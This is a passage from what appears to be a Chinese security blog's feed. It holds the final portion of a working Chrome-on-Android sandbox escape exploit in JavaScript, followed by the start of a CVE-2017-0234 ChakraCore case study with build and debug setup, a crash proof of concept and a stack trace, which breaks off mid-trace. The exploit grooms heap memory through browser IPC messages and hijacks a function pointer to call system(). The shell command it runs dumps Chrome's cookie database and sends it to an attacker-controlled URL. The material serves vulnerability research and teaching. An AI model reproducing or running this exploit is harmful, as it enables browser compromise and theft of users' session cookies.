class="line">        <span class="string">'memset'</span>,</span><br><span class="line">        <span class="string">'malloc'</span>,</span><br><span class="line">        <span class="string">'__errno'</span>,</span><br><span class="line">        <span class="string">'fcntl'</span>,</span><br><span class="line">        <span class="string">'bsd_signal'</span>,</span><br><span class="line">        <span class="string">'tkill'</span>,</span><br><span class="line">        <span class="string">'getpid'</span>,</span><br><span class="line">        <span class="string">'gettid'</span>,</span><br><span class="line">        <span class="string">'futex'</span>,</span><br><span class="line">        <span class="string">'usleep'</span>,</span><br><span class="line">        <span class="string">'mmap'</span>,</span><br><span class="line">        <span class="string">'munmap'</span>,</span><br><span class="line">        <span class="string">'system'</span></span><br><span class="line">    ];</span><br><span class="line">    funcs = &#123;&#125;;</span><br><span class="line">    syms.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sym</span>) </span>&#123;</span><br><span class="line">        funcs[sym] = dlsym(sym);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    scratch = call(funcs.malloc, <span class="number">0x1000</span>); <span class="comment">// no real need for yet another buffer, but I don't want to break anything</span></span><br><span class="line">    assert(scratch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mypid = call(funcs.getpid), mytid = call(funcs.gettid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sockets = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> fd = <span class="number">5</span>; fd &lt; <span class="number">100</span>; fd++) &#123;</span><br><span class="line">        write32(scratch + <span class="number">0x78</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(call(funcs.getsockopt, fd, SOL_SOCKET, SO_TYPE, scratch + <span class="number">0x74</span>, scratch + <span class="number">0x78</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sockets == <span class="number">2</span>) &#123;</span><br><span class="line">                fd_pipe_ = fd;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sockets == <span class="number">7</span>) &#123;</span><br><span class="line">                pipe_ = fd;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sockets++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(fd != <span class="number">100</span>);</span><br><span class="line">    alert(<span class="string">'+3'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block the IO thread (and all the other ones) for a moment</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> SIGUSR2 = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAIT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAKE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> myfutex = scratch;</span><br><span class="line">    assert(call(funcs.bsd_signal, SIGUSR2, stub2) != NEGONE);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x10</span>, myfutex);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x14</span>, FUTEX_WAIT);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x18</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x1c</span>, <span class="number">0</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x20</span>, funcs.futex);</span><br><span class="line">    write32(myfutex, <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> tid = mypid + <span class="number">1</span>; tid &lt; mypid + <span class="number">1000</span>; tid++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tid == mytid) <span class="keyword">continue</span>;</span><br><span class="line">        call(funcs.tkill, tid, SIGUSR2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// In practice, this is quite predictable (+ no guards!) and nowhere</span></span><br><span class="line">    <span class="comment">// near this many copies is actually necessary.  But we do what we</span></span><br><span class="line">    <span class="comment">// can...</span></span><br><span class="line">    <span class="keyword">var</span> guessedAddress = <span class="number">0xa0a0a0a0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> PINUSE_BIT = <span class="number">1</span>, CINUSE_BIT = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> chunkSize = <span class="number">0x68</span>;</span><br><span class="line">        <span class="keyword">var</span> fakeHead = chunkSize | PINUSE_BIT | CINUSE_BIT;</span><br><span class="line">        setNonblock(pipe_, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">var</span> fds = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> stream_id = <span class="number">0</span>; stream_id &lt; <span class="number">100</span>; stream_id++) &#123;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00250067</span>, <span class="comment">// AudioHostMsg_CreateStream</span></span><br><span class="line">                    MInt(stream_id), <span class="comment">// stream_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// render_view_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// session_id</span></span><br><span class="line">                    <span class="comment">// params</span></span><br><span class="line">                    MInt(<span class="number">2</span>), <span class="comment">// format=AUDIO_PCM_FAKE</span></span><br><span class="line">                    MInt(<span class="number">29</span>), <span class="comment">// channel_layout=CHANNEL_LAYOUT_DISCRETE</span></span><br><span class="line">                    MInt(<span class="number">3000</span>), <span class="comment">// sample_rate</span></span><br><span class="line">                    MInt(<span class="number">32</span>), <span class="comment">// bits_per_sample</span></span><br><span class="line">                    MInt(<span class="number">192000</span>), <span class="comment">// frames_per_buffer</span></span><br><span class="line">                    MInt(<span class="number">31</span>), <span class="comment">// channels</span></span><br><span class="line">                    MInt(<span class="number">0</span>)); <span class="comment">// input_channels</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> msg = messageReceive([</span><br><span class="line">                    <span class="number">0x00250032</span>, <span class="comment">// AudioMsg_NotifyStreamCreated</span></span><br><span class="line">                    <span class="number">0x00250053</span> <span class="comment">// AudioMsg_NotifyStreamStateChanged</span></span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(msg.type == <span class="number">0x00250032</span>) &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'handle'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'socket_handle'</span>),</span><br><span class="line">                        MInt(<span class="string">'length'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">var</span> len = msg.length;</span><br><span class="line">                <span class="comment">//log += 'len=' + len + '\n';</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> PROT_READ = <span class="number">1</span>, PROT_WRITE = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">var</span> MAP_SHARED = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                fds.push([msg.handle, len]);</span><br><span class="line">                <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, msg.handle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                assert(addr != NEGONE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Sadly, there is no copy-on-write memcpy on Linux like</span></span><br><span class="line">                <span class="comment">// vm_copy on OS X.  Oh well, we have lots of RAM.</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = guessedAddress &amp; <span class="number">0xfff</span>; i &lt; len; i += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                    <span class="comment">// head</span></span><br><span class="line">                    write32(addr + i + <span class="number">4</span>, fakeHead);</span><br><span class="line">                    <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">                    write32(addr + i + <span class="number">8</span>, NEGONE);</span><br><span class="line">                    write32(addr + i + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// dunno if we have enough address space here</span></span><br><span class="line">                assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MInt(<span class="string">'new_state'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += '**' + JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        log += <span class="string">'got up to '</span> + stream_id + <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// And here is the actual sandbox vulnerability.  This is pretty dumb.</span></span><br><span class="line">        <span class="comment">// This calls Map on the specified pointer, which should fail, then</span></span><br><span class="line">        <span class="comment">// frees it, putting a free allocation in shared memory.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sidenote: It might be possible to use addresses in libchromeview to</span></span><br><span class="line">        <span class="comment">// avoid the ASLR spamming.  dlmalloc's free has a basic check for</span></span><br><span class="line">        <span class="comment">// addresses being &gt;= the first mmapped address, but I think</span></span><br><span class="line">        <span class="comment">// libchromeview happens to be at such addresses.  However, this is</span></span><br><span class="line">        <span class="comment">// easier so who cares...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> CBF_SMBITMAP = <span class="number">7</span>;</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">            MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">            MInt(CBF_SMBITMAP),</span><br><span class="line">            MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">            MInt(guessedAddress + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">            MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        call(funcs.usleep, <span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucketStart;</span><br><span class="line">        fds:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; fds.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> fd = fds[i][<span class="number">0</span>], len = fds[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            assert(addr != NEGONE);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = guessedAddress &amp; <span class="number">0xfff</span>; j &lt; len; j += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(addr + j + <span class="number">8</span>) != NEGONE) &#123;</span><br><span class="line">                    assert(j + <span class="number">0x1000</span> &lt;= len); <span class="comment">// too lazy to fix</span></span><br><span class="line">                    bucketStart = addr + j;</span><br><span class="line">                    <span class="keyword">break</span> fds;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(i != fds.length);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">            <span class="comment">// now that we know where it is, do more frees to decrease</span></span><br><span class="line">            <span class="comment">// the chance of spurious allocations (this would probably</span></span><br><span class="line">            <span class="comment">// be better redesigned, but whatever)</span></span><br><span class="line">            <span class="keyword">var</span> bucket = bucketStart + bucketOff;</span><br><span class="line">            write32(bucket + <span class="number">4</span>, fakeHead);</span><br><span class="line">            <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">            write32(bucket + <span class="number">8</span>, NEGONE);</span><br><span class="line">            write32(bucket + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">                MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">                MInt(CBF_SMBITMAP),</span><br><span class="line">                MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">                MInt(guessedAddress + bucketOff + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">                MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// This is an arbitrary-ish call that allocates an unusually large</span></span><br><span class="line">        <span class="comment">// object with a vtable.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucket, bucketInBrowser;</span><br><span class="line">        <span class="keyword">var</span> socket_id = <span class="number">1000</span>;</span><br><span class="line">        outer:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> P2P_SOCKET_TCP_CLIENT = <span class="number">3</span>;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190044</span>, <span class="comment">// P2PHostMsg_CreateSocket</span></span><br><span class="line">                MInt(P2P_SOCKET_TCP_CLIENT), <span class="comment">// type</span></span><br><span class="line">                MInt(++socket_id), <span class="comment">// socket_id</span></span><br><span class="line">                <span class="comment">// local_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// port</span></span><br><span class="line">                <span class="comment">// remote_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0x80808080</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">1234</span>)); <span class="comment">// port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            call(funcs.usleep, <span class="number">20000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">                bucket = bucketStart + bucketOff;</span><br><span class="line">                <span class="keyword">if</span>(read32(bucket + <span class="number">8</span> + <span class="number">0x5c</span>) == P2P_SOCKET_TCP_CLIENT) &#123;</span><br><span class="line">                    bucketInBrowser = guessedAddress + bucketOff;</span><br><span class="line">                    <span class="keyword">break</span> outer;</span><br><span class="line">                &#125;</span><br><span class="line">                write32(bucket, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">100000</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Didn't get allocated or wrong allocation or something"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// There's probably a simpler way but... I've never actually had a</span></span><br><span class="line">        <span class="comment">// chance to use system in an exploit before :]</span></span><br><span class="line">        write32(bucket + <span class="number">8</span>, bucketInBrowser - <span class="number">4</span>);</span><br><span class="line">        <span class="comment">// don't reuse please, this will be unmapped</span></span><br><span class="line">        write32(bucket + <span class="number">4</span>, <span class="number">0x10000</span> | CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">        write32(bucket, funcs.system);</span><br><span class="line">        <span class="keyword">var</span> url = <span class="built_in">window</span>.location.origin + <span class="string">'/sb.png'</span>;</span><br><span class="line">        copystr(bucket + <span class="number">12</span>, <span class="string">'; am start --user 0 -a android.intent.action.VIEW -d "'</span> + url + <span class="string">'?`hd -c 1024 /data/data/com.android.chrome/app_chrome/Default/Cookies`" &amp; kill $PPID'</span>);</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190052</span>, <span class="comment">// P2PHostMsg_DestroySocket</span></span><br><span class="line">            MInt(socket_id));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        xerr = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok, we're done...</span></span><br><span class="line">    setNonblock(pipe_, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    call(funcs.usleep, <span class="number">100000</span>);</span><br><span class="line">    write32(myfutex, <span class="number">0</span>);</span><br><span class="line">    call(funcs.futex, myfutex, FUTEX_WAKE, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//messageSend(0xfffffffe, 0xfffe);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(xerr) &#123;</span><br><span class="line">        alert(<span class="string">'Exception: '</span> + xerr + <span class="string">'\n'</span> + xerr.stack);</span><br><span class="line">        crash();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">'?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dlsym</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    copystr(callbuf + <span class="number">0x28</span>, name);</span><br><span class="line">    <span class="keyword">var</span> result = call(dlsym_addr, <span class="number">0xffffffff</span>, callbuf + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"couldn't find "</span> + name);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    initialOverwrite();</span><br><span class="line">    launderBuffers(buffersToForce, <span class="string">'saveBuffersToForce'</span>, sniffAroundInHeap);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    alert(<span class="string">'Exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>case study:cve-2017-0234</title>
    <link href="http://eternalsakura13.com/2018/07/03/cve-2017-0234-2.0/"/>
    <id>http://eternalsakura13.com/2018/07/03/cve-2017-0234-2.0/</id>
    <published>2018-07-03T13:32:43.339Z</published>
    <updated>2018-07-20T02:53:34.999Z</updated>
    
    <content type="html"><![CDATA[<h3 id="vs调试环境配置"><a href="#vs调试环境配置" class="headerlink" title="vs调试环境配置"></a>vs调试环境配置</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>首先下载<a href="https://github.com/Microsoft/ChakraCore" target="_blank" rel="noopener">ChakraCore</a><br>然后<code>git clone https://github.com/Microsoft/ChakraCore.git</code><br>在ChakraCore项目中搜索CVE-2017-0234，找到patch的commit，然后得到有漏洞的版本的hash<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070412.jpg" alt=""><br>然后checkout,<code>git checkout d8ef97d90c231e83db96dc4fdff4b39409f7a9b6</code><br>然后在VS2015中打开<code>Build\Chakra.Core.sln</code>，并生成解决方案<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070434.jpg" alt=""></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070449.jpg" alt=""><br>右键设置为启动项目<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070458.jpg" alt=""><br>在命令参数写好绝对路径并执行<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070506.jpg" alt=""><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070515.jpg" alt=""></p><h3 id="windbg调试环境配置"><a href="#windbg调试环境配置" class="headerlink" title="windbg调试环境配置"></a>windbg调试环境配置</h3><p>在windows store下载windbg preview<br>设置符号服务器<br><code>SRV*c:\edgesymbol*http://msdl.microsoft.com/download/symbols</code><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070526.jpg" alt=""><br>直接调试chakra<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070550.jpg" alt=""><br>Windbg preview可以直接查看源码，在源码点击下断,很方便。</p><h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step) view[i] = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1851880825</span>);</span><br></pre></td></tr></table></figure></p><p> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070621.jpg" alt=""><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070909.jpg" alt=""><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-070946.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&gt;k</span><br><span class="line"> 索引     函数      </span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"> 1      0000018d9694015c()</span><br><span class="line">*2      ChakraCore.dll!Js::InterpreterStackFrame::CallLoopBody(void *(*)(Js::RecyclableObject *, Js::CallInfo) address=0x0000018d96940000)</span><br><span class="line"> 3      ChakraCore.dll!Js::InterpreterStackFrame::DoLoopBodyStart(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, const bool doProfileLoopCheck=false, bool isFirstIteration=true)</span><br><span class="line"> 4      ChakraCore.dll!Js::InterpreterStackFrame::ProfiledLoopBodyStart&lt;1,1&gt;(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, bool isFirstIteration=true)</span><br><span class="line"> 5      ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledLoopStart&lt;0,1&gt;(const unsigned char * ip=0x0000018d96828b49)</span><br><span class="line"> 6      ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 7      ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 8      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x0000019598284540, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fba, void * addressOfReturnAddress=0x0000002e3a7fe4b8, const bool isAsmJs=false)</span><br><span class="line"> 9      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fe4f0)</span><br><span class="line"> 10     [外部代码]  </span><br><span class="line"> 11     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 12     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x0000019598284540, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 13     ChakraCore.dll!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=16, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 14     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfileCallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=0, unsigned short profileId=3, unsigned int inlineCacheIndex=3, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 15     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, unsigned int flags=0)</span><br><span class="line"> 16     ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 17     ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 18     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x00000195982844e0, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fc2, void * addressOfReturnAddress=0x0000002e3a7fef48, const bool isAsmJs=false)</span><br><span class="line"> 19     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fef80)</span><br><span class="line"> 20     [外部代码]  </span><br><span class="line"> 21     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 22     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * 